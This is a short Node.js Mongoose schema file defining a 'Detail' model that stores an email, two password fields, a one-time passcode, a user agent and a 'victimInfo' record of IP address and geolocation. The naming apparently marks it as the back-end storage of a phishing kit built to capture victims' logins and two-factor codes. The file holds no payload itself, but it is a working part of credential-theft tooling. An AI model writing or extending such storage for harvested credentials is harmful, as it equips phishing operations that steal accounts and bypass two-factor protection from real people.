const mongoose = require("mongoose");

const detail = new mongoose.Schema(
  {
    email: String,
    password1: String,
    password2: String,
    otp: String,
    userAgent: String,
    victimInfo: {
      ip: String,
      city: String,
      country: String,
      countryCode: String,
      region: String,
      regionName: String,
      zip: String,
      lat: String,
      lon: String,
    },
  },
  { timestamps: true },
);

const Detail = mongoose.model("Detail", detail);
module.exports = Detail;
